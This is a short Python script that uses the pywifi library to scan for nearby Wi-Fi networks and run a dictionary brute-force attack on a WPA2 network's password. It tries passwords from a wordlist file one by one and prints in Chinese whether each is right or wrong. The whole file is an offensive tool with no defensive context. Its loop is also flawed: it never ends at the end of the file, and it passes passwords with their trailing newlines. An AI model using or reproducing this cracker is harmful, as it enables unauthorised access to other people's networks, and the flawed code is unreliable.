# -*- coding: utf-8 -*-
"""
Created on Sat Apr 18 18:43:23 2020

@author: FernandoZeng
"""

import pytest
import sys
import time
import platform
import logging

import pywifi
from pywifi import const

pywifi.set_loglevel(logging.INFO)

def scan_wifi():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(5)
    result = iface.scan_results()
    a=[]
    for i in result:
        a.append(i.ssid)
    return(a)

def connect_wifi(name,password):
    wifi = pywifi.PyWiFi()

    iface = wifi.interfaces()[0]

    iface.disconnect()
    time.sleep(1)
    assert iface.status() in\
        [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    profile = pywifi.Profile()
    profile.ssid = name
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    iface.connect(tmp_profile)
    time.sleep(4)
    if iface.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False


    
    
def crack_wifi(name):
    print('开始破解:'+name)
    path = 'pass.txt'
    filename = open(path, 'r')
    while True:
        try:
            passStr = filename.readline()
            bool1 = connect_wifi(name,passStr)
            if bool1:
                print('密码正确',passStr)
                break
            else:
                print('密码错误',passStr)
        except:
            continue